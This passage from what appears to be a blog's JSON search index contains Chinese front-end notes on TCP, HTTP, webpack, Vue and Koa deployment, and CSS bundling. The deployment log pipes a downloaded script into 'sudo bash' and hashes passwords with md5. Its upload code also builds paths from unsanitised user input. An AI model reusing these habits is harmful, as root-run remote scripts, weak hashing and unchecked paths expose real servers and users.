https.png%}\n<a href=\"https://blog.csdn.net/u012361288/article/details/54883154\">https://blog.csdn.net/u012361288/article/details/54883154</a></p>\n<p><a href=\"http://www.cnblogs.com/lovesong/p/5186200.html\">http://www.cnblogs.com/lovesong/p/5186200.html</a></p>\n<h3 id=\"tcp的三次握手和四次挥手画图（当场画写ack-和-seq的值）为什么tcp要三次握手四次挥手？\">tcp的三次握手和四次挥手画图（当场画写ack 和 seq的值）,为什么tcp要三次握手四次挥手？</h3>\n<p>{%asset_img tcp_3_wo.png%}\n{%asset_img tcp_4_hui.png%}</p>\n<h4 id=\"tcp与udp的区别\">TCP与UDP的区别</h4>\n<p>1、TCP面向连接（如打电话要先拨号建立连接）;UDP是无连接的，即发送数据之前不需要建立连接。</p>\n<p>2、TCP提供可靠的服务。也就是说，通过TCP连接传送的数据，无差错，不丢失，不重复，且按序到达;UDP尽最大努力交付，即不保证可靠交付。</p>\n<p>3、TCP面向字节流，实际上是TCP把数据看成一连串无结构的字节流;UDP是面向报文的。UDP没有拥塞控制，因此网络出现拥塞不会使源主机的发送速率降低（对实时应用很有用，如IP电话，实时视频会议等）。</p>\n<p>4、每一条TCP连接只能是点到点的;UDP支持一对一，一对多，多对一和多对多的交互通信。</p>\n<p>5、TCP首部开销20字节;UDP的首部开销小，只有8个字节。</p>\n<p>6、TCP的逻辑通信信道是全双工的可靠信道，UDP则是不可靠信道。</p>\n<h4 id=\"http2的持久连接和管线化\">http2的持久连接和管线化</h4>\n<p>在长连接的基础上，将客户端的其他请求都交给这一个连接去处理。这里服务器需要注意一件事情。那就是这个请求的先后顺序是不能颠倒的</p>\n<p>在使用持久连接的情况下，某个连接消息的传递类似于</p>\n<p>请求1 -&gt; 响应1 -&gt; 请求2 -&gt; 响应2</p>\n<p>管线化：某个连接上的消息变成了类似这样 </p>\n<p>请求1 -&gt; 请求2 -&gt; 请求3 -&gt; 响应1 -&gt; 响应2 -&gt; 响应3</p>\n<ol>\n<li><p>只有GET和HEAD要求可以进行管线化，而POST则有所限制</p>\n</li>\n<li><p>初次创建连接时也不应启动管线机制，因为对方（服务器）不一定支持HTTP/1.1版本的协议。</p>\n</li>\n<li><p>HTTP1.1要求服务器端支持管线化，但并不要求服务器端也对响应进行管线化处理，只是要求对于管线化的请求不失败，而且现在很多服务器端和代理程序对管线化的支持并不好，现代浏览器Chrome和Firefox默认并未开启管线化支持</p>\n<h4 id=\"域名发散和域名收敛\">域名发散和域名收敛</h4>\n<p>浏览器对于同一域名下允许的并发请求数作了限制\n{%asset_img per-hostname-max.jpg%}\n域名发散就是为了突破浏览器对于同一域名并发请求数的限制</p>\n</li>\n</ol>\n<p>域名收敛就是将静态资源放在一个域名下不进行发散，这主要是为了适应移动端的发展需求；通常DNS是一个开销较大的操作，而移动端由于网络带宽和实时性、资源等的限制，这些开销对移动端的用户体验是致命的，因此需要进行域名收敛；</p>\n<h3 id=\"五大浏览器四大内核\">五大浏览器\\四大内核</h3>\n<p>四大内核分别是：Trident（也称IE内核）、webkit、Blink、Gecko。</p>\n<p>五大浏览器采用的都是单内核，而随着浏览器的发展现在也出现了双内核。像360浏览器、QQ浏览器都是采用双内核。</p>\n<ol>\n<li>IE                   ：Trident；</li>\n<li>Chrome               ：Webkit  ----&gt; Blink；</li>\n<li>Firefox              ：Gecko</li>\n<li>Safari               ：Webkit；</li>\n<li>Opera                ：自己的Presto内核 ----&gt; Webkit ----&gt;Blink</li>\n<li>360、猎豹             ：Trident + Chrome；</li>\n<li>搜狗、遨游、QQ浏览器   ：Trident（兼容模式）+ Webkit（高速模式）；</li>\n<li>百度览器、世界之窗     ：Trident；</li>\n<li>2345                 ：Trident ----&gt; IE + Chrome；</li>\n</ol>\n<h3 id=\"webpack的loader和plugins的区别\">webpack的loader和plugins的区别</h3>\n<p>loader 用于加载某些资源文件。 因为webpack 本身只能打包commonjs规范的js文件，对于其他资源例如 css，图片，或者其他的语法集，比如 jsx， coffee，是没有办法加载的。 这就需要对应的loader将资源转化，加载进来。从字面意思也能看出，loader是用于加载的，它作用于一个个文件上。</p>\n<p>plugin 用于扩展webpack的功能。它直接作用于 webpack，扩展了它的功能。当然loader也时变相的扩展了 webpack ，但是它只专注于转化文件（transform）这一个领域。而plugin的功能更加的丰富，而不仅局限于资源的加载</p>\n<h4 id=\"对模块化了解吗？说说有哪些模块化的库，有了解过模块化的发展的历史吗？（commonjs，requirejs，seajs）\">对模块化了解吗？说说有哪些模块化的库，有了解过模块化的发展的历史吗？（commonJS，RequireJS，SeaJS）</h4>\n<p><a href=\"https://segmentfault.com/a/1190000011081338\">https://segmentfault.com/a/1190000011081338</a></p>\n<p>AMD CMD ，这两个东西是一种规范，他们实际产物是 AMD是RequireJS，CMD的产物是seajs，他们的出现都是在COMMONjs基础上发展而来的。</p>\n<p>AMD偏向于依赖前置，CMD偏向于用到时才运行的思路，从而导致了依赖项的加载和运行时间点会不同</p>\n<h4 id=\"commonjs和es6的加载区别\">CommonJS和ES6的加载区别</h4>\n<p>与CommonJS用require()方法加载模块不同，在ES6中，import命令可以具体指定加载模块中用export命令暴露的接口（不指定具体的接口，默认加载export default），没有指定的是不会加载的，因此会在编译时就完成模块的加载，这种加载方式称为编译时加载或者静态加载。\n而CommonJS的require()方法是在运行时才加载的</p>\n<h4 id=\"模块化\">模块化</h4>\n<p>对AMD,CMD,CommonJS有没有了解?\n为什么要模块化？不用的时候和用RequireJs的时候代码大概怎么写？\n说说有哪些模块化的库，有了解过模块化的发展的历史吗？\n分别说说同步和异步模块化的应用场景，说下AMD异步模块化实现的原理？\n如何将项目里面的所有的require的模块语法换成import的ES6的语法？\n使用模块化加载时，模块加载的顺序是怎样的，如果不知道，根据已有的知识，你觉得顺序应该是怎么样的？</p>\n<h4 id=\"深入vue2x的虚拟dom-diff原理\">深入Vue2.x的虚拟DOM diff原理</h4>\n<p>仅在同级的vnode间做diff\n（一）优先处理特殊场景</p>\n<p>（1）oldstart和newstart同类型 \\ oldend和newend同类型:不用移动它们对应的DOM</p>\n<p>（2）oldStart和newEnd，以及oldEnd和newStart指向同类节点的: 直接移动DOM就好</p>\n<p>（二）、“原地复用”</p>\n<p>Vue在判断更新前后指针是否指向同一个节点，其实不要求它们真实引用同一个DOM节点，实际上它仅判断指向的是否是同类节点（比如2个不同的div，在DOM上它们是不一样的，但是它们属于同类节点），如果是同类节点，那么Vue会直接复用DOM，这样的好处是不需要移动DOM。</p>\n<p><a href=\"https://blog.csdn.net/m6i37jk/article/details/78140159#commentBox\">https://blog.csdn.net/m6i37jk/article/details/78140159#commentBox</a></p>\n<h4 id=\"一个静态资源要上线，里面有各种资源依赖，你如何平稳上线\">一个静态资源要上线，里面有各种资源依赖，你如何平稳上线</h4>\n<p><a href=\"http://www.yyyweb.com/4707.html\">http://www.yyyweb.com/4707.html</a></p>\n<p>配置超长时间的本地缓存 —— 节省带宽，提高性能</p>\n<p>采用内容摘要作为缓存更新依据 —— 精确的缓存控制</p>\n<p>静态资源CDN部署 —— 优化网络请求</p>\n<p>更资源发布路径实现非覆盖式发布 —— 平滑升级</p>\n","index":24},{"filePath":"post\\2018\\vue_koa_blog.md","htmlPath":"/post/2018/vue_koa_blog.html","name":"vue_koa_blog.md","type":"md","title":"koa建站及部署","date":"2018/5/22","categories":"Experience","tags":"日常记录","html":"<p>参考</p>\n<p><a href=\"https://segmentfault.com/a/1190000009469890\">SimpleMDE编辑器 + 提取HTML + 美化输出</a></p>\n<p><a href=\"https://segmentfault.com/a/1190000007004199\">用 vue koa 和mongo 撸了个人博客和博客管理网站</a></p>\n<p><a href=\"https://www.v2ex.com/t/357255\">前端 vue+后端 koa，全栈式开发 bilibili 首页</a></p>\n<p><a href=\"http://cnodejs.org/topic/5a66b313ce45d44045146277\">分享我个人学习项目：系统管理平台（基于vue，koa2前后端分离）</a></p>\n<p><a href=\"https://www.cnblogs.com/junhua/p/7714572.html\">koa+mongoose实现简单增删改查接口</a></p>\n<p><a href=\"https://www.jianshu.com/p/6b816c609669\">koa2从起步到填坑</a></p>\n<p><a href=\"https://www.jianshu.com/p/6c1e4fcc6d6f\">vue使用highlight.js</a></p>\n<p><a href=\"https://www.jianshu.com/p/2e31fd9eb048\">阿里云ECS服务器部署Node.js项目全过程详解</a>\n<a href=\"https://blog.csdn.net/u013263917/article/details/79037770\">Nodejs项目部署阿里云完整流程</a>\n<a href=\"https://www.cnblogs.com/beileixinqing/p/9152113.html\"> koa2使用阿里云oss的nodejs sdk实现上传图片</a>\n<a href=\"https://help.aliyun.com/document_detail/50775.html?spm=5176.doc25426.6.655.kn1mB7\"></a></p>\n<h3 id=\"2018-5-22\">2018-5-22</h3>\n<p>windows下查找特定端口</p>\n<pre><code>cd c:\\WINDOWS\\system32\\ \nnetstat -aon|findstr &quot;3000&quot;</code></pre><p><code>W:\\MongoDB\\bin\\mongod --dbpath W:\\MongoDB\\data</code> 运行 MongoDB 服务器\npm2</p>\n<p><code>mongo</code> 连接MongoDB</p>\n<p>一些常用命令</p>\n<pre><code>show dbs\nuse ...\ndb.dropDatabase()\nshow collections\ndb.collection.drop()\ndb.users.find().pretty()</code></pre><ul>\n<li><p>Vue准备</p>\n<pre><code>npm install -g @vue/cli\nvue init webpack  admin \nnpm i --registry https://registry.npm.taobao.org</code></pre><p>安装<code>sass-loader\\node-sass\\axios\\element-ui</code></p>\n</li>\n<li><p>Koa2准备</p>\n<pre><code>npm install -g koa-generator \nkoa2 server //创建koa2项目</code></pre><p>安装<code>koa-router\\mongoose\\koa2-cors</code></p>\n</li>\n</ul>\n<p><code>co</code>模块可以将异步解放成同步。co 函数接受一个 generator 函数作为参数，在函数内部自动执行 yield 。(没用这个在别处看到)</p>\n<p><code>npm install --save koa-router</code></p>\n<p>koa-router在处理post请求时，koa无法解析http请求体中的数据，这时我们需要引入另外一个模块叫做<code>koa-bodyparser</code>。\n引入<code>bodyparser</code>之后需要注册到app对象上，且在router之前注册，然后才可能在router的post请求的处理函数中获取http请求体中的数据。</p>\n<h3 id=\"2018-5-23\">2018-5-23</h3>\n<p><code>npm install --save koa2-cors</code></p>\n<p>koa2-cors 解决跨域问题</p>\n<pre><code>Response to preflight request doesn&#39;t pass access control check: No &#39;Access-Control-Allow-Origin&#39; header is present on the requested resource.\nhttps://github.com/zadzbw/koa2-cors </code></pre><ul>\n<li>axios</li>\n</ul>\n<p>如果没有<code>type=file</code>的控件，用默认的<code>application/x-www-form-urlencoded</code>就可以了。\n 但是如果有<code>type=file</code>的话，就要用到<code>multipart/form-data</code>了。</p>\n<p> 要给<code>ctx.response.body</code>赋值，否则会404</p>\n<p><code>withCredentials:true</code> 代表请求带cookies</p>\n<h3 id=\"2018-5-31\">2018-5-31</h3>\n<p><code>npm install md5 --save</code>密码加密</p>\n<p><code>npm install mavon-editor --save</code>富文本编辑器</p>\n<h3 id=\"2018-6-5\">2018-6-5</h3>\n<p>这两点很重要</p>\n<p>axios传data   ---&gt; 用ctx.request.body提取</p>\n<p>axios传params ---&gt; 用ctx.query提取</p>\n<p>mongose用_id查询的话用<code>findById(id)</code>.</p>\n<p><code>npm install marked --save</code>  md转化成html</p>\n<p><code>npm install hightlight.js --save</code> 高亮代码块</p>\n<h3 id=\"2018-6-6\">2018-6-6</h3>\n<p><code>npm install moment --save</code> 格式化日期</p>\n<p>使用mongoose的<code>timestamp</code>/<code>virtual</code></p>\n<p>让MongoDB自动生成和管理createTime和updateTime字段的值，参考：<a href=\"https://www.cnblogs.com/duhuo/p/6232534.html\">Mongoose Schemas中定义日期以及timestamps选项的妙用</a></p>\n<p>格式化Date使用schema.virtual。参考\n<a href=\"https://cnodejs.org/topic/5532466b1b9662da568db904\">mongoose Schema设置virtual属性不起作用</a></p>\n<p>问题：搜索、上传图片</p>\n<h3 id=\"2018-6-7\">2018-6-7</h3>\n<p>遇到一个很纠结的问题，目前用的postId都是使用mongoose自动生产的_id.但是在新建文章的时候，我把上传文件和保存文章的服务分开做，分别是不同的collection，如果用_id的话那上传图片的时候不知道那个_id,这种情况下只能在保存好文章之后返回_id再上传图片，这样不是很优雅。</p>\n<p>试一试用同一个collection好了</p>\n<p>form表单里有文件，又有文本，该怎么办？ 解决方案总的有两种：</p>\n<p>1、使用formData实现文件和文本同时提交</p>\n<p>2、先ajax上传文件，返回文件url，再和文本一起提交，我称作伪提交。</p>\n<p>一般数据库中存放的是图片的路径和名称，实际图片是存放在服务器上的，显示的时候只是在页面指定其路径和名称从而获取。</p>\n<p>koa-bodyParser中间件 [详情介绍 <a href=\"https://github.com/koajs/bodyparser%5D\">https://github.com/koajs/bodyparser]</a>\n默认支持json form类型的数据，但是不支持form-data类型的数据 不怎么好用 </p>\n<p>koa-multer中间件 [详情介绍 <a href=\"https://github.com/koa-modules/multer%5D\">https://github.com/koa-modules/multer]</a>\n不同的koa版本，支持不同的multer版本,以及在使用的方式上也有所不同,使用方式查看以上链接文档.\nkoa-multer仅仅支持multipart/form-data类型的数据</p>\n<p>koa-body [详情介绍 <a href=\"https://github.com/dlau/koa-body%5D\">https://github.com/dlau/koa-body]</a>\n支持三种类型的数据</p>\n<p>1、multipart/form-data\n2、application/x-www-urlencoded\n3、application/json</p>\n<p>新版本的koa-body通过ctx.request.files获取上传的文件。\n旧版本的koa-body通过ctx.request.body.files获取上传的文件 </p>\n<p><a href=\"http://www.jb51.net/article/137369.htm\">Koa2 之文件上传下载的示例代码</a>\n<a href=\"https://www.xttblog.com/?p=1753\"></a></p>\n<p>使用koa-body时，文件用<code>ctx.request.files</code>获取，而不是<code>ctx.request.body.files</code></p>\n<p>现在上传一个图片没有问题了，上传多个文件出现问题\n<code>path must be a string or Buffer</code></p>\n<h3 id=\"2018-8-6\">2018-8-6</h3>\n<p>上传多个图片，为什么不能遍历\n<a href=\"https://segmentfault.com/q/1010000015899152\">https://segmentfault.com/q/1010000015899152</a>\n最后这样</p>\n<pre><code>let files = ctx.request.files;\n通过files[&#39;file&#39;];取得数组。</code></pre><p>一次上次多张图片的代码：</p>\n<pre><code class=\"language-js\"> ADD_POST :{\n        method:&#39;post&#39;,\n        url :&#39;/post/new&#39;,\n        headers: { &#39;Content-Type&#39;: `multipart/form-data`},\n    },</code></pre>\n<pre><code class=\"language-js\">function upload(files,title){  \n    let imgList=[],file,url,name;\n\n    files = files[&#39;file&#39;];//关键！！！！！！\n    if(files==undefined) return [];\n    if(files.length){//如果是一个数组\n        for(let index in files){\n            file = files[index];     \n\n            url=`uploads/${title}-${file.name}`;\n            name =`${title}-${file.name}`;\n            fs.createReadStream(file.path).pipe(fs.createWriteStream(url))\n\n            imgList.push([index,name]);\n        }\n    }else{   \n        file = files;        \n        url=`uploads/${title}-${file.name}`;\n        name =`${title}-${file.name}`;\n        fs.createReadStream(file.path).pipe(fs.createWriteStream(url))\n        imgList.push([0,name]);\n    }\n\n     return imgList;\n\n}\nexports.new = async(ctx, next)=&gt;{\n    let {title,body,tags,category}=ctx.request.body;\n    let files = ctx.request.files;//重点\n    let imgList=[];\n    if(files) imgList = upload(files,title);\n\n    let post = new Post({\n        title,\n        body,\n        tags,\n        category,\n        imgList\n    })\n    let result= await dbHelper.Save(post);\n    ctx.response.body = result;    \n}</code></pre>\n<p>接下来看看怎么获取后端照片 ==&gt; \n<code>app.use(require(&#39;koa-static&#39;)(__dirname + &#39;/uploads&#39;))</code></p>\n<p>$img2Url老是报错</p>\n<h3 id=\"2018-8-26\">2018-8-26</h3>\n<p>koa-session\n为了弥补HTTP的无状态，就有了cookies和session.之前没有seesion的时候都用的是cookies.</p>\n<p>当程序需要给某个客户端请求创建一个session时，服务器会检查请求里面是否包含sessionid,服务器把这个session找出来就行了。没有就创建，返回sessionid给客户端保存.</p>\n<p>服务端重启会清除session.session持久化方法：cookies,redis,MongoDB,硬盘内存\n<a href=\"https://www.jianshu.com/p/8f4cc45d712e\">koa-session</a></p>\n<p>用户权限管理：中间件</p>\n<h3 id=\"2018-10-13\">2018-10-13</h3>\n<ul>\n<li>npm install bcrypt报错.\nCan&#39;t find Python executable &quot;python&quot;, you can set the PYTHON env variable.</li>\n</ul>\n<p>这里需要依赖python.推荐使用bcrypt-</p>\n<ul>\n<li><p>今天一直搞不懂404错误，最后在一个中间件加上await next()就可以了。</p>\n</li>\n<li><p><em>所有中间件都要加上await next()，无论它有没有提供数据给下一个*</em></p>\n</li>\n<li><p>图片还是一张一张上传比较好，不然mavonEditor得不到图片地址。传完立刻用<code>$img2Url</code>把图片地址插入到md里面</p>\n</li>\n</ul>\n<h3 id=\"2018-10-14\">2018-10-14</h3>\n<p>mongoose中间件一般仅仅只能限于在几个方法中使用. (但感觉就已经是全部了)\ninit,validate,save,remove;</p>\n<p>非常重要的一点是中间件只是在document级别有效，如findAndUpdate等方法不会触发中间件，因为这不是document级别的操作。</p>\n<h3 id=\"2018-10-31\">2018-10-31</h3>\n<p>一般是在本地npm run serve看效果,但是终端关掉就访问不了了。在VPS上怎么做才不会关掉终端之后还可以继续访问?用 <strong>pm2</strong> !!\n<code>pm2 start npm --watch --name XXX -- run start   相当于 (npm run start)</code></p>\n<h3 id=\"2018-11-3\">2018-11-3</h3>\n<p>不要在服务器里面上传图片了，怕以后占的空间太大，直接用github里面的图片的链接好了</p>\n<h3 id=\"2018-12-27\">2018-12-27</h3>\n<p>centos 安装nodejs\nyum install -y gcc-c++ make\ncurl -sL <a href=\"https://rpm.nodesource.com/setup_9.x\">https://rpm.nodesource.com/setup_9.x</a> | sudo -E bash -\nyum install nodejs</p>\n<p>ngix安装\n<a href=\"https://www.cnblogs.com/taiyonghai/p/6728707.html\">https://www.cnblogs.com/taiyonghai/p/6728707.html</a></p>\n<p>搭建网站过程\n<a href=\"https://www.jianshu.com/p/4895cda92808\">https://www.jianshu.com/p/4895cda92808</a></p>\n<p>添加到开机自启动项\nvi /etc/rc.d/rc.local\nmongod --dbpath /home/mongodb/data --logpath /home/mongodb/logs/log.log -fork\nchmod +x /etc/rc.d/rc.local</p>\n<p>添加环境变量\nvim /etc/profile\n在最后，添加:\nexport PATH=&quot;/usr/local/mongodb/bin:$PATH&quot;\n保存，退出，然后运行：\nsource /etc/profile不报错则成功。</p>\n<p>tar zxvf openssl-fips-2.0.10.tar.gz -C /home\n./config &amp;&amp; make &amp;&amp; make install</p>\n<p>sbin/nginx -s reload</p>\n","index":25},{"filePath":"post\\2019\\2019.md","htmlPath":"/post/2019/2019.html","name":"2019.md","type":"md","title":"2019遇到的问题","date":"2019/2/1","categories":"Experience","tags":"日常记录","html":"<h2 id=\"20192\">2019/2</h2>\n<h3 id=\"ie浏览器url中文乱码\">IE浏览器url中文乱码</h3>\n<p>IE浏览器直接拼接url,中文会乱码，需要像下面这样进行转码</p>\n<pre><code> &lt;a :href=&quot;`/ctyun/clientcase?tag=${encodeURI(data[current].tag)}`&quot; &gt;</code></pre><p> 用router-link的就不用转码：</p>\n<pre><code> &lt;router-link :to=&quot;{name:&#39;clientcase&#39;,query:{tag:item.tag}}&quot; &gt;\n 或者\n&lt;router-link v-if=&quot;item.id&quot; :to=&quot;{path:`/clientcase?tag=${item.tag}&amp;id=${item.id}`}&quot; &gt;</code></pre><h3 id=\"组件上有ref的话，这个组件不可以使用懒加载\">组件上有ref的话，这个组件不可以使用懒加载</h3>\n<pre><code>  &lt;template v-for=&quot;item in partnerList&quot;&gt;\n    &lt;case-item :data=&quot;item&quot; :key=&quot;item.index&quot; :ref=&quot;`case${item.id}`&quot;&gt;&lt;/case-item&gt;\n&lt;/template&gt;</code></pre><pre><code class=\"language-js\">    components: { CaseItem },//正确的做法\n    components: { CaseItem:()=&gt;import(&#39;....&#39;) },//懒加载的做法  \n getData(type, offset, limit) {\n    xxxxx.then((res) =&gt; {\n    this.partnerList.push(...res.item);\n    this.scrollTo(this.selectedId);\n    });\n},\nscrollTo(id) {\n    this.$nextTick(() =&gt; {\n        const target = this.$refs[`case${id}`];\n        xxxxx\n    });\n},</code></pre>\n<p>如果<code>&lt;case-item&gt;</code>是懒加载的话，第一次进入这个页面<code>target = this.$refs[`case${id}`];</code>是undefined</p>\n<h3 id=\"clickfunc和clickfun的区别\">@click=&quot;func&quot;和@click=&quot;fun()&quot;的区别</h3>\n<ol>\n<li>如果func函数没有参数，就没有区别</li>\n<li>如果func函数有参数，例如<code>func(arg){...}</code>，那么<code>@click=&quot;func&quot;</code> 在func(arg)里面输出arg并不是undefined，而是一个事件对象</li>\n</ol>\n<p>#:class可以是一个数组</p>\n<pre><code class=\"language-js\">boxClazz(){\n    return [&#39;box&#39;,  !this.canAddHideAnimationLater ? &#39;&#39; : this.visible ? &#39;show&#39;: &#39;hide&#39;]\n}\n&lt;nav :class=&quot;boxClazz&quot; &gt;&lt;/nav&gt;</code></pre>\n<h3 id=\"动态挂载组件\">动态挂载组件</h3>\n<pre><code class=\"language-js\">import Vue from &#39;vue&#39;;\nimport imgPreview from &#39;./img-preview.vue&#39;;\nlet instance;\n\nlet imgPreviewConsturctor = Vue.extend(imgPreview);\n\n\nconst initInstance = () =&gt; {\n  const el = document.createElement(&#39;div&#39;)\n  el.id=&quot;__img_preview_box&quot;\n  document.body.appendChild(el);\n  instance = new imgPreviewConsturctor().$mount(`#${el.id}`);\n\n};\n\nconst init = (imgSrc) =&gt; {\n    if(!instance){\n        initInstance();\n    }\n    instance.imgSrc = imgSrc;\n    instance.visible = true;\n}\nexport default {\n    init\n}</code></pre>\n<h3 id=\"body上加上over-flowhidden获取scrolltop会不准确\">body上加上over-flow:hidden获取scrollTop会不准确</h3>\n<h3 id=\"fixed定位页面抖动解决方法\">fixed定位页面抖动解决方法</h3>\n<p>这方法是看微博网站代码看到的，完美！！其他百度上的方法没一个管用</p>\n<p>fixed定位的元素加上</p>\n<pre><code class=\"language-css\">nav-tab{\n  z-index: 10;\n  transform: translateZ(0px);\n  position: relative;\n  transition: top 0.3s ease 0s;\n  will-change:top;\n}  </code></pre>\n<p>页面上加多一个同等高度的容器</p>\n<pre><code class=\"language-html\">&lt;!--关键--&gt;\n&lt;div :style=&quot;{height:fixNav?`${nav-height}px`:0}&quot;&gt;&lt;/div&gt;\n&lt;!--fixed定位的元素--&gt;\n&lt;nav-tab  :class=&quot;{&#39;fix-nav&#39;:fixNav}&quot;&gt;&lt;/nav-tab&gt;</code></pre>\n<h3 id=\"vucli3构建库模式大坑\">vucli3构建库模式大坑</h3>\n<ol>\n<li>代码里不能有懒加载，不然打出来的文件不止1个，引入的时候路径不对</li>\n<li>图片不能<code>&lt;img src&gt;</code>渲染，会找不到路径。可以用background-image解决</li>\n<li><code>new consturctor().$mount();</code>的时候，生命周期钩子mouted在<code>$mount()</code>过程中就会执行.</li>\n<li><code>import Vue from &#39;vue&#39;</code> 得到的也不是主项目的vue<pre><code class=\"language-js\"> //方案：把vue实例当做props传进去\n instance = new feedbackConsturctor({\n      //！！！依赖库手动挂载的节点的__proto__跟主项目的__proto__不是同一个，会导致断链\n      propsData:{\n          http$ : _VUE_.prototype.http$\n      }}).$mount();</code></pre>\n</li>\n<li>vue父子组件之间是没有原型链的，手动$mount()的组件$root是自己。所以子组件如果要使用主项目的数据，可以<pre><code class=\"language-js\"> data(){\n     return { http$:this.$root.http$ }\n }</code></pre>\n</li>\n</ol>\n<h3 id=\"可以利用src做请求\">可以利用src做请求</h3>\n<pre><code>send(url, params){\n\n        const img = new Image;\n        img.src = `${url}?${this.serializeParams(params, true)}`;\n    }</code></pre><h2 id=\"20196\">2019/6</h2>\n<h3 id=\"overflow-y-visible不起作用\">overflow-y: visible不起作用</h3>\n<p>在container上添加以下样式</p>\n<pre><code>padding-top: 20px;\nmargin-top: -20px;</code></pre><h3 id=\"ie在本地运行出错\">IE在本地运行出错</h3>\n<p>但是部署到测试环境是正常的，吓死个人了</p>\n<p>函数节流不管事件触发有多频繁，都会保证在规定时间内一定会执行一次真正的事件处理函数，\n而函数防抖只是在最后一次事件后才触发一次函数。 比如在页面的无限加载场景下，我们需要用户在滚动页面时，每隔一段时间发一次 Ajax 请求，而不是在用户停下滚动页面操作时才去请求数据。这样的场景，就适合用节流技术来实现</p>\n<h2 id=\"201910\">2019/10</h2>\n<h3 id=\"ie-el-button嵌套a不能跳转\">IE el-button嵌套<a>不能跳转</h3>\n<h3 id=\"ie-下修改windowlocationhref不能跳转\">IE 下修改window.location.href不能跳转</h3>\n<h3 id=\"弹出新标签页\">弹出新标签页</h3>\n<p>chrome都可以</p>\n<pre><code>window.open(nextUrl);// firefox\\IE\\chrome都可以\n\nlet a = document.createElement(&#39;a&#39;);\na.click();// firfox不行\n\n//firefox提示弹窗允许\nconst evt = document.createEvent(&#39;MouseEvents&#39;);\n    evt.initEvent(&#39;click&#39;, true, true);\n    a.dispatchEvent(evt);</code></pre>","index":26},{"filePath":"post\\2019\\css-improve.md","htmlPath":"/post/2019/css-improve.html","name":"css-improve.md","type":"md","title":"关于css打包后过大的问题","date":"2019/1/15","categories":"Experience","tags":"专题探究","html":"<h3 id=\"公共代码多次放在scoped内\">公共代码多次放在scoped内</h3>\n<p>我们很多时候写了一个公共的common.scss,然后在各个vue里面</p>\n<pre><code class=\"language-scss\">&lt;style scoped&gt;\nimport  &#39;@/assets/css/common.scss&#39;\n&lt;/style&gt;</code></pre>\n<p>由于加了scoped，导致common里面的样式都加上了<code>[data-v-aaaa]</code>这样的标识，最后打出来的css重复，这就不是公共css了。</p>\n<p>并且在多少个vue里面import就会打包多少次common.scss进去，最后导致css打出来很大。</p>\n<h3 id=\"公共代码多次放在scoped外\">公共代码多次放在scoped外</h3>\n<p>下面的代码打包出来只会有一份global.scss，也就是不会重复打包。所以为了方便，直接在main.js引入一次就够了</p>\n<pre><code class=\"language-scss\">//a.vue\n&lt;style &gt;\n@import &#39;@/assets/css/global.scss&#39;\n&lt;/style&gt;</code></pre>\n<pre><code class=\"language-scss\">//b.vue\n&lt;style &gt;\n@import &#39;@/assets/css/global.scss&#39;\n&lt;/style&gt;</code></pre>\n<h3 id=\"公共代码放scoped外，自定义代码放scoped内\">公共代码放scoped外，自定义代码放scoped内</h3>\n<p> 为了不重复打包，那我把公共的css代码拿出来不放在scoped里面不就好了。</p>\n<pre><code class=\"language-scss\">//global.scss\n.white{ color:#fff}</code></pre>\n<pre><code class=\"language-scss\">//a.vue\n&lt;style &gt;\n@import &#39;@/assets/css/global.scss&#39;\n&lt;/style&gt;</code></pre>\n<p>但是下面这个情况不行，运行会报错：<code>$white is not defined</code></p>\n<pre><code class=\"language-scss\">// variable.scss\n$white:#fff;</code></pre>\n<pre><code class=\"language-scss\">//a.vue\n&lt;style &gt;\n@import &#39;@/assets/css/variable.scss&#39;\n&lt;/style&gt;\n&lt;style scoped&gt;\n.white{\n    color:$white;\n}\n&lt;style/&gt;</code></pre>\n<p>然后试了一下</p>\n<pre><code class=\"language-scss\">&lt;style scoped&gt;\n@import &#39;@/assets/css/variable.scss&#39;\n.white{\n    color:$white;\n}\n&lt;/style&gt;</code></pre>\n<p>发现打出来的css里面变量$white直接编译成#fff了，打包后的css里面找不到$white,所以就不用担心会重复打包这些变量了。</p>\n<h3 id=\"webpack打包后体积依然过大的css文件\">webpack打包后体积依然过大的css文件</h3>\n<p> 之前控制台中心在IE9浏览器下样式混乱。说是IE浏览器对css有些约束</p>\n<p><a href=\"https://blogs.msdn.microsoft.com/ieinternals/2011/05/14/stylesheet-limits-in-internet-explorer/\">Stylesheet Limits in Internet Explorer</a></p>\n<p><a href=\"https://blog.csdn.net/napoleonxxx/article/details/80292006\">参考博客</a></p>\n<p>然后用了下面两个插件解决。好像也可以设置splitChunk解决，不过试了效果不太满意，后面再继续探究。</p>\n<pre><code class=\"language-js\">optimization: {\n    minimizer: [\n    new CSSSplitWebpackPlugin({\n        size: 4000,\n        filename: path.posix.join(assetsDir,&#39;css/[name]-[part].[ext]&#39;),\n        }),  \n    new OptimizeCSSAssetsPlugin({\n        assetNameRegExp: /\\.css$/g,\n        cssProcessor: require(&#39;cssnano&#39;),\n        cssProcessorOptions: { discardComments: {removeAll: true },reduceIdents:false },\n        canPrint: true\n    }),             \n    ]\n},</code></pre>\n<p><a href=\"https://blog.csdn.net/napoleonxxx/article/details/80292006\">IE9引发的血案-如何处理webpack打包后体积依然过大的css文件</a></p>\n<h2 id=\"总结：\">总结：</h2>\n<ol>\n<li>把css变量单独拎出来做一个文件variable.scss，在vue的<code>&lt;style scoped&gt;</code>里@import使用</li>\n<li>公共css文件在main.js里面直接import一次就好，不要再在其他vue里面import</li>\n<li>多人协作防止冲突，各组件的公共css文件我觉得可以在外面用一个自己的class包裹起来。例如</li>\n</ol>\n<pre><code class=\"language-js\">//main.js\nimport &#39;@/views/order/style.scss&#39;;</code></pre>\n<pre><code class=\"language-scss\">//@/views/order/style.scss\n.order{\n    xxxxx\n}</code></pre>\n<p>最后把控制台的代码按照上面的方法整理了一下，结果打包出来的css足足小了127kb\n<img src=\"./css-improve-effect.png\"></p>\n<p>------------------2019/2/19更新------------------</p>\n<p>注意：之前在想，既然<code>&lt;style&gt;&lt;/style&gt;</code>(不用scoped)放在哪里都可以全局生效，那我随便放在一个大组件里也行啊。\n最近发现在一个组件里面不用scoped地引入css,从这个组件进去另一个组件，另一个组件确实是会受到前者css的影响。\n但是如果直接打开后者组件的页面，不经过前者，css无效。所以全局css还是放在main里面好。</p>\n<p>------------------2019/2/27更新------------------</p>\n<p>关于上面 <strong>webpack打包后体积依然过大的css文件</strong>的问题我发现还有一种解决方法：<strong>使用懒加载</strong>，使用方法如下：\n<a href=\"https://alexjover.com/blog/lazy-load-in-vue-using-webpack-s-code-splitting/\">Lazy Loading in Vue using Webpack&#39;s Code Splitting</a></p>\n<p>懒加载会把每个vue组件变成一个chunk,自然对应css也会变成一个chunk。<span 